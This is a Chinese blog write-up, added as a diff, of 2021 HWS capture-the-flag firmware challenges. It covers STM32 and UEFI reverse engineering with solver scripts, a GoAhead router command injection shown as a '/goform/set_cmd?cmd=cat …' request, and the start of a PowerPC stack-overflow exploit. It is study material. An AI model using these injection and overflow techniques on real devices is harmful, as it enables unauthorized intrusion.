@@ -1,0 +1,613 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、练习题                           1.SMT32固件                           (1)IDA分析                           ①选择架构       需要在加载界面选择架构，如图选择ARM小端序                      ②设置选项       处理器选项设置对应">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021HWS固件学习">
+<meta property="og:url" content="http://pig-007.github.io/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="一、练习题                           1.SMT32固件                           (1)IDA分析                           ①选择架构       需要在加载界面选择架构，如图选择ARM小端序                      ②设置选项       处理器选项设置对应">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191621446.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191623892.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191626607.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191628430.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632420.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632453.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632698.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633721.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633077.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191636846.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191744973.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191752096.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191755068.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191756417.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191758415.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191803171.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191806862.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201257297.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201305567.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307664.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307395.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201436882.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201442069.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201446022.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447384.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447608.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201505983.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201553654.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201557194.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201558569.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201559030.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201549732.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201949396.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201953531.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201955804.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201202003613.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850770.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850841.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211856001.png">
+<meta property="article:published_time" content="2022-01-17T02:27:33.000Z">
+<meta property="article:modified_time" content="2022-01-21T11:07:12.401Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="2021HWS固件学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png"><title>2021HWS固件学习 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">2021HWS固件学习</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-21</span></span></div></header><div class="post-body">
+        <h1 id="一、练习题"   >
+          <a href="#一、练习题" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、练习题" class="headerlink" title="一、练习题"></a>一、练习题</h1>
+      
+        <h2 id="1-SMT32固件"   >
+          <a href="#1-SMT32固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMT32固件" class="headerlink" title="1.SMT32固件"></a>1.SMT32固件</h2>
+      
+        <h3 id="1-IDA分析"   >
+          <a href="#1-IDA分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-IDA分析" class="headerlink" title="(1)IDA分析"></a>(1)IDA分析</h3>
+      
+        <h4 id="①选择架构"   >
+          <a href="#①选择架构" class="heading-link"><i class="fas fa-link"></i></a><a href="#①选择架构" class="headerlink" title="①选择架构"></a>①选择架构</h4>
+      <p>需要在加载界面选择架构，如图选择ARM小端序</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png" alt="image-20220119162036357"></p>
+
+        <h4 id="②设置选项"   >
+          <a href="#②设置选项" class="heading-link"><i class="fas fa-link"></i></a><a href="#②设置选项" class="headerlink" title="②设置选项"></a>②设置选项</h4>
+      <p>处理器选项设置对应</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191621446.png" alt="du"></p>
+
+        <h4 id="③选择固件加载地址"   >
+          <a href="#③选择固件加载地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#③选择固件加载地址" class="headerlink" title="③选择固件加载地址"></a>③选择固件加载地址</h4>
+      <p>OK之后，进入填写加载地址的界面，修改如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191623892.png" alt="image-20220119162333850"></p>
+<p>这个对于SMT32这种类型的固件是一定的，需要自己去上网查询，Input file的loading address可以让我们输入其他值，就使得IDA不从头加载，而从我们输入的地址开始加载。</p>
+
+        <h4 id="④寻找函数地址"   >
+          <a href="#④寻找函数地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#④寻找函数地址" class="headerlink" title="④寻找函数地址"></a>④寻找函数地址</h4>
+      
+        <h4 id="A-查找中断处理函数"   >
+          <a href="#A-查找中断处理函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-查找中断处理函数" class="headerlink" title="A.查找中断处理函数"></a>A.查找中断处理函数</h4>
+      <p>在最开头地址+4的地方保存的是中断处理函数，按d转换数据双击点进去即可</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191626607.png" alt="image-20220119162645572"></p>
+
+        <h4 id="B-识别函数"   >
+          <a href="#B-识别函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-识别函数" class="headerlink" title="B.识别函数"></a>B.识别函数</h4>
+      <p>发现是奇数地址，那么在奇数地址-1的地方，按c，即可分析出一些函数</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191628430.png" alt="image-20220119162843385"></p>
+<p>其中0x08000100即为中断处理函数，相对于SMT32固件而言，该函数的第二次跳转地址上的首次跳转的最后跳转再跳转即为main函数地址</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632420.png" alt="image-20220119163217387"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632453.png" alt="image-20220119163231426"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632698.png" alt="image-20220119163255655"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633721.png" alt="image-20220119163337683"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633077.png" alt="image-20220119163359036"></p>
+
+        <h3 id="2-解密"   >
+          <a href="#2-解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解密" class="headerlink" title="(2)解密"></a>(2)解密</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191636846.png" alt="image-20220119163634811"></p>
+<p>分析之后，即可找到对应的加密算法，按照上述逻辑恢复即可</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = [   </span><br><span class="line">        <span class="number">0x7D</span>,<span class="number">0x77</span>,<span class="number">0x40</span>,<span class="number">0x7A</span>,<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x2A</span>,<span class="number">0x2F</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x40</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x2C</span>,<span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x2B</span>,<span class="number">0x28</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x7C</span>,<span class="number">0x41</span>,<span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x28</span>,<span class="number">0x33</span>,<span class="number">0x7E</span>,<span class="number">0x30</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0x7E</span>,<span class="number">0x2F</span>,<span class="number">0x31</span>,<span class="number">0x2A</span>,<span class="number">0x41</span>,<span class="number">0x7F</span>,<span class="number">0x2F</span>,<span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="built_in">chr</span>((i ^ <span class="number">0x1E</span>) + <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="2-BlinkBlink-200"   >
+          <a href="#2-BlinkBlink-200" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BlinkBlink-200" class="headerlink" title="2.BlinkBlink_200"></a>2.BlinkBlink_200</h2>
+      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/#blinkblink" >HWS2021冬令营选拔赛 | Clang鱼塘 (blingblingxuanxuan.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="1-固件解包"   >
+          <a href="#1-固件解包" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-固件解包" class="headerlink" title="(1)固件解包"></a>(1)固件解包</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me uImage</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-当前目录搜索"   >
+          <a href="#2-当前目录搜索" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-当前目录搜索" class="headerlink" title="(2)当前目录搜索"></a>(2)当前目录搜索</h3>
+      <p>该命令可在当前文件夹下搜索密码，一般这种路由器的密码都是从/etc/passwd中取得</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri &quot;etc/passwd&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191744973.png" alt="image-20220119174406881"></p>
+<p>排除busybox和libc，那么先去goahead中找，直接拖进IDA32分析</p>
+<p>goahead是一个嵌入式的Web服务器：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.embedthis.com/goahead/" >https://www.embedthis.com/goahead/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h4 id="①定位字符串"   >
+          <a href="#①定位字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#①定位字符串" class="headerlink" title="①定位字符串"></a>①定位字符串</h4>
+      <p>搜索字符串<code>set_qos_cfg</code>，这个常用，找到如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191752096.png" alt="image-20220119175251051"></p>
+<p>漏洞常常在<code>goform</code>接口下，简单查看一下，发现其中有一个<code>set_cmd</code>的引用</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191755068.png" alt="image-20220119175504033"></p>
+<p>进入函数，发现一个设置命令的函数<code>bs_SetCmd</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191756417.png" alt="image-20220119175643376"></p>
+
+        <h4 id="②分析函数"   >
+          <a href="#②分析函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②分析函数" class="headerlink" title="②分析函数"></a>②分析函数</h4>
+      <p>参照上面的函数名称，继续搜索</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191758415.png" alt="image-20220119175815328"></p>
+<p>发现定位在libshare中，打开分析一下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191803171.png" alt="image-20220119180323116"></p>
+<p>其中off_4F2CC的值为%s，即格式化为字符串输出给v21，那么很明显就是使用<code>popen</code>进行命令执行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191806862.png" alt="image-20220119180607832"></p>
+
+        <h4 id="③URL访问"   >
+          <a href="#③URL访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#③URL访问" class="headerlink" title="③URL访问"></a>③URL访问</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/goform/set_cmd?cmd=cat /home/goahead/flag.txt</span><br></pre></td></tr></table></div></figure>
+
+<p>这里就是调用goform的接口API进行测试即可获得flag</p>
+
+        <h2 id="3-httpd"   >
+          <a href="#3-httpd" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-httpd" class="headerlink" title="3.httpd"></a>3.httpd</h2>
+      <p>不太会</p>
+
+        <h2 id="4-nodemcu"   >
+          <a href="#4-nodemcu" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-nodemcu" class="headerlink" title="4.nodemcu"></a>4.nodemcu</h2>
+      <p>直接出</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings nodemcu.bin</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201257297.png" alt="image-20220120125706243"></p>
+<p>看来以后都先strings一把梭试试</p>
+
+        <h2 id="5-easybios"   >
+          <a href="#5-easybios" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-easybios" class="headerlink" title="5.easybios"></a>5.easybios</h2>
+      
+        <h3 id="1-前置探索"   >
+          <a href="#1-前置探索" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置探索" class="headerlink" title="(1)前置探索"></a>(1)前置探索</h3>
+      <p>按照命令提示启动，但是有时候可以，有时候又不可以，可能在等一下就可以？</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201305567.png" alt="image-20220120130559529">给了提示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307664.png" alt="image-20220120130724621"></p>
+<p>尝试一下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307395.png" alt="image-20220120130702363"></p>
+
+        <h3 id="2-IDA分析"   >
+          <a href="#2-IDA分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IDA分析" class="headerlink" title="(2)IDA分析"></a>(2)IDA分析</h3>
+      <p>使用binwalk解包</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me easybios</span><br></pre></td></tr></table></div></figure>
+
+<p>然后IDA打开解包出来的二进制文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201436882.png" alt="image-20220120143603848"></p>
+<p>搜索一下Wrong字符串，没搜到，尝试用unicode格式搜索，即UTF-16LE格式，一个字符两个字节。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201442069.png" alt="image-20220120144209024"></p>
+<p>然后加上00即可-&gt;<code>57 00 72 00 6F 00 6E 00 67 00</code>，找到两个</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201446022.png" alt="image-20220120144641985"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447384.png" alt="image-20220120144707349"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447608.png" alt="image-20220120144725574"></p>
+<p>很明显应该是下面那个，但是这个文件有点大，不好解析，再加上之前在解包的时候看到包含很多PE文件，所以这个程序应该也是在一个PE文件里，那么我们依据地址，找到对应的PE文件头尾</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201505983.png" alt="image-20220120150501890"></p>
+
+        <h3 id="3-切割分析"   >
+          <a href="#3-切割分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-切割分析" class="headerlink" title="(3)切割分析"></a>(3)切割分析</h3>
+      
+        <h4 id="①寻找头尾地址"   >
+          <a href="#①寻找头尾地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#①寻找头尾地址" class="headerlink" title="①寻找头尾地址"></a>①寻找头尾地址</h4>
+      <p>依据地址找到以下头尾</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201553654.png" alt="image-20220120155301520"></p>
+
+        <h4 id="②使用Winhex进行切割"   >
+          <a href="#②使用Winhex进行切割" class="heading-link"><i class="fas fa-link"></i></a><a href="#②使用Winhex进行切割" class="headerlink" title="②使用Winhex进行切割"></a>②使用Winhex进行切割</h4>
+      <p>使用Winhex打开，然后找到头尾，使用alt+G搜索地址，选定头尾</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201557194.png" alt="image-20220120155739157"></p>
+<p>头部</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201558569.png" alt="image-20220120155816532"></p>
+<p>尾部</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201559030.png" alt="image-20220120155907991"></p>
+<p>选中选快，右键编辑-&gt;复制选块-&gt;至新文件，然后保存用IDA打开，照常使用全局搜索字符<code>57 00 72 00 6F 00 6E 00 67 00</code>找到对应的函数<code>sub_31D6F</code>，一番判断如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201549732.png" alt="image-20220120154940674"></p>
+<p>然后顺着逻辑理清楚即可，或者尝试使用angr解题，以下exp参照<code>lxonz师傅</code></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://nosec.org/home/detail/4672.html" >2021HWS冬令营线上赛固件安全WriteUp|NOSEC安全讯息平台 - 白帽汇安全研究院</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_bytes_hex</span>(<span class="params">data</span>):</span></span><br><span class="line">    lin = [<span class="string">&#x27;%0x&#x27;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(lin))</span><br><span class="line"></span><br><span class="line">magic = <span class="string">&#x27;OVMF_And_Easy_Bios&#x27;</span></span><br><span class="line">demo = [<span class="number">0x46</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0xb0</span>, <span class="number">0x27</span>, <span class="number">0x8e</span>, <span class="number">0x8f</span>, <span class="number">0x5b</span>, <span class="number">0xe9</span>, <span class="number">0xd8</span>, <span class="number">0x46</span>, <span class="number">0x9c</span>, <span class="number">0x72</span>, <span class="number">0xe7</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>]</span><br><span class="line">v13 = [<span class="number">0</span>]*<span class="number">514</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v13[i] = i</span><br><span class="line">    v13[i+<span class="number">256</span>] = <span class="built_in">ord</span>(magic[i%<span class="number">18</span>])</span><br><span class="line"></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">while</span> v2!=<span class="number">256</span>:</span><br><span class="line">    v4 = v13[v2]</span><br><span class="line">    v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span></span><br><span class="line">    v5 = v13[v3]</span><br><span class="line">    v13[v3] = v4</span><br><span class="line">    v13[v2] = v5</span><br><span class="line">    v2+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> v6 != <span class="number">16</span>:</span><br><span class="line">    v8 = v8 + <span class="number">1</span></span><br><span class="line">    v9 = v13[v8]</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v11 = v13[v10]</span><br><span class="line">    v13[v10] = v9</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v13[v8] = v11</span><br><span class="line">    result = v13[(v11 + v13[v10]) % <span class="number">256</span>]</span><br><span class="line">    new_list.append(result)</span><br><span class="line">    <span class="comment">#(v0 + v6) ^= result</span></span><br><span class="line">    v6 += <span class="number">1</span></span><br><span class="line"><span class="comment">#print len(demo)</span></span><br><span class="line"><span class="comment">#print len(new_list)</span></span><br><span class="line">flag_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    flag_list.append(new_list[i]^demo[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(new_list[i]^demo[i]))</span><br><span class="line">print_bytes_hex(flag_list)</span><br><span class="line"><span class="comment">#flag&#123;88baec0b5154f859b5851097bb567f5c&#125;</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="6-PPPPPPC"   >
+          <a href="#6-PPPPPPC" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-PPPPPPC" class="headerlink" title="6.PPPPPPC"></a>6.PPPPPPC</h2>
+      
+        <h3 id="1-调试"   >
+          <a href="#1-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-调试" class="headerlink" title="(1)调试"></a>(1)调试</h3>
+      <p>powerpc大端架构</p>
+<p>调试发现栈溢出，读入0x320，并且变量偏移在0x140，可覆盖$lr寄存器，控制程序流，保护都没开，就尝试ret2shellcode</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201949396.png" alt="image-20220120194956344"></p>
+
+        <h3 id="2-泄露地址"   >
+          <a href="#2-泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-泄露地址" class="headerlink" title="(2)泄露地址"></a>(2)泄露地址</h3>
